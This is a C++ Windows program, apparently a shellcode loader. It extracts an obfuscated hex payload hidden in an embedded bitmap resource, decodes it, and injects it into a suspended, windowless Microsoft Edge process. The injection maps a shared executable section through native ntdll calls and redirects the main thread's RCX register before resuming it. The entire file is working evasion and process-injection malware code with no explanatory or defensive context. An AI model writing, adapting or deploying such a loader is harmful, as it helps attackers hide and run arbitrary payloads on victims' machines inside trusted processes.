#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <windows.h>
#include <winternl.h>

#include "Native.h"
#include "resource.h"


// Restoring
std::string restoreHexDigits(const std::string& replacedHex) {
    std::string restored;
    for (char c : replacedHex) {
        // decode 0 to 5 - letter - g to l
        if (c >= 'g' && c <= 'l') {
            restored.push_back('0' + (c - 'g'));
        }
        else {
            restored.push_back(c);
        }
    }
    return restored;
}

// Function to extract the bmp file
std::string extractResource() {
    HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDB_BITMAP1), RT_BITMAP);
    if (!hRsrc) {
        std::cerr << "Erreur : Ressource ICO non trouvée dans l'exécutable." << std::endl;
        return "";
    }

    // Load the ressource
    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
    if (!hGlobal) {
        std::cerr << "Erreur : Impossible de charger la ressource." << std::endl;
        return "";
    }

    // Lock and obtain the pointer
    PVOID ptr = LockResource(hGlobal);
    if (!ptr) {
        std::cerr << "Erreur : Impossible de verrouiller la ressource." << std::endl;
        return "";
    }

    // file size
    SIZE_T size = SizeofResource(NULL, hRsrc);
    if (size == 0) {
        std::cerr << "Erreur : La taille de la ressource est nulle." << std::endl;
        return "";
    }

    // Convert data
    std::string result(reinterpret_cast<const char*>(ptr), size);
    return result;
}

// Function of extract the data delimited
std::string extractHexDataFromString(const std::string& data) {
    std::string delimiter_start = "\n--START_HEX_DATA--\n";
    std::string delimiter_end = "\n--END_HEX_DATA--\n";

    size_t start_pos = data.find(delimiter_start);
    size_t end_pos = data.find(delimiter_end);

    if (start_pos == std::string::npos || end_pos == std::string::npos) {
        std::cerr << "Délimiteurs non trouvés dans la ressource." << std::endl;
        return "";
    }

    // data exetract
    std::string hex_data = data.substr(start_pos + delimiter_start.length(), end_pos - (start_pos + delimiter_start.length()));

    return hex_data;
}

std::vector<unsigned char> hexToBinary(const std::string& hex_string) {
    std::vector<unsigned char> binary_data;
    for (size_t i = 0; i < hex_string.length(); i += 2) {
        std::string byte_str = hex_string.substr(i, 2);
        unsigned char byte = (unsigned char)std::stoi(byte_str, nullptr, 16);
        binary_data.push_back(byte);
    }
    return binary_data;
}

int main() {
    // Extract the payload
    std::string raw_data = extractResource();
    if (raw_data.empty()) {
        return 1;
    }

    std::string hex_data = extractHexDataFromString(raw_data);
    if (hex_data.empty()) {
        return 1;
    }

    std::string restored_hex = restoreHexDigits(hex_data);

    std::vector<unsigned char> shellcode = hexToBinary(restored_hex);

    // create startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0";

    // create process
    CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info);

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");


    // create section in local process
    HANDLE hSection;
    LARGE_INTEGER szSection = { shellcode.size() };

    NTSTATUS status = ntCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL);

    // map section into memory of local process
    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;

    status = ntMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &hLocalAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // copy shellcode into local memory
    RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

    // map section into memory of remote process
    PVOID hRemoteAddress = NULL;

    status = ntMapViewOfSection(
        hSection,
        process_info->hProcess,
        &hRemoteAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // get context of main thread
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(process_info->hThread, pContext);

    // update rcx context
    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(process_info->hThread, pContext);

    // resume thread
    ResumeThread(process_info->hThread);

    // unmap memory from local process
    status = ntUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress);
    return 0;
}
